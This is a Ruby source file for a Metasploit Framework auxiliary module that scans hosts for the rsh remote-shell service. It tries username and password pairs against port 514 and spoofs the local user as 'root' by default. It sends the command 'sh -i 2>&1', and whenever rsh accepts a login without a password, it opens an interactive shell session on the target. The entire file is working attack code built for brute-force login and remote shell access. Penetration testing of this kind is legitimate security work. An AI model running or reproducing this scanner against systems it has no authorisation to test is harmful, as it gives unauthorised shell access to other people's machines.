##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::RServices
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::AuthBrute
	include Msf::Auxiliary::Scanner
	include Msf::Auxiliary::CommandShell

	def initialize
		super(
			'Name'        => 'rsh Authentication Scanner',
			'Version'     => '$Revision$',
			'Description' => %q{
					This module will test a shell (rsh) service on a range of machines and
				report successful logins.

				NOTE: This module requires access to bind to privileged ports (below 1024).
			},
			'References' =>
				[
					[ 'CVE', '1999-0651' ]
				],
			'Author'      => [ 'jduck '],
			'License'     => MSF_LICENSE
		)

		register_options(
			[
				Opt::RPORT(514),
				OptBool.new('ENABLE_STDERR', [ true, 'Enables connecting the stderr port', false ])
			], self.class)
	end

	def run_host(ip)
		print_status("#{ip}:#{rport} - Starting rsh sweep")

		if datastore['ENABLE_STDERR']
			# For each host, bind a privileged listening port for the target to connect
			# back to.
			ret = listen_on_privileged_port
			if not ret
				return :abort
			end
			sd, lport = ret
		else
			sd = lport = nil
		end

		# The maximum time for a host is set here.
		Timeout.timeout(300) {
			each_user_pass { |user, pass|
				do_login(user, pass, sd, lport)
			}
		}

		sd.close if sd
	end


	def do_login(user, pass, sfd, lport)
		vprint_status("#{target_host}:#{rport} - Attempting rsh with username:password '#{user}':'#{pass}'")

		cmd = datastore['CMD']
		cmd ||= 'sh -i 2>&1'
		luser = datastore['LOCALUSER']
		luser ||= 'root'

		# We must connect from a privileged port.
		return :abort if not connect_from_privileged_port(1022)

		sock.put("#{lport}\x00#{luser}\x00#{user}\x00#{cmd}\x00")

		if sfd and lport
			stderr_sock = sfd.accept
			add_socket(stderr_sock)
		else
			stderr_sock = nil
		end

		# Read the expected nul byte response.
		buf = sock.get_once(1)
		return :abort if buf != "\x00"

		# NOTE: We report this here, since we are awfully convinced now that this is really
		# an rsh service.
		report_service(
			:host => rhost,
			:port => rport,
			:proto => 'tcp',
			:name => 'rsh'
		)

		# should we report a vuln here? rsh allowed w/o password?!
		print_good("#{target_host}:#{rport}, rsh '#{user}' from '#{luser}' with no password.")
		start_rsh_session(rhost, rport, user, luser, pass, buf, stderr_sock)

		return :next_user

	# For debugging only.
	#rescue ::Exception
	#	print_error("#{$!}")
	#	return :abort

	ensure
		disconnect()

	end


	#
	# This is only needed by RSH so it is not in the rservices mixin
	#
	def listen_on_privileged_port
		lport = 1023
		sd = nil
		while lport > 512
			#vprint_status("Trying to listen on port #{lport} ..")
			sd = nil
			begin
				sd = Rex::Socket.create_tcp_server('LocalPort' => lport)

			rescue Rex::AddressInUse
				# Ignore and try again

			end

			break if sd
			lport -= 1
		end

		if not sd
			print_error("Unable to bind to listener port")
			return false
		end

		add_socket(sd)
		#print_status("Listening on port #{lport}")
		[ sd, lport ]
	end


	def start_rsh_session(host, port, user, luser, pass, proof, stderr_sock)
		report_auth_info(
			:host	=> host,
			:port	=> port,
			:sname => 'rsh',
			:user	=> user,
			:luser => luser,
			:pass	=> pass,
			:proof  => proof,
			:active => true
		)

		merge_me = {
			'USERPASS_FILE' => nil,
			'USER_FILE'     => nil,
			'PASS_FILE'     => nil,
			'USERNAME'      => user,
			'LOCALUSER'     => luser,
			'PASSWORD'      => pass,
			# Save a reference to the socket so we don't GC prematurely
			:stderr_sock    => stderr_sock
		}

		# Don't tie the life of this socket to the exploit
		self.sockets.delete(stderr_sock)

		start_session(self, "RSH #{user}:#{pass} (#{host}:#{port})", merge_me)
	end

end
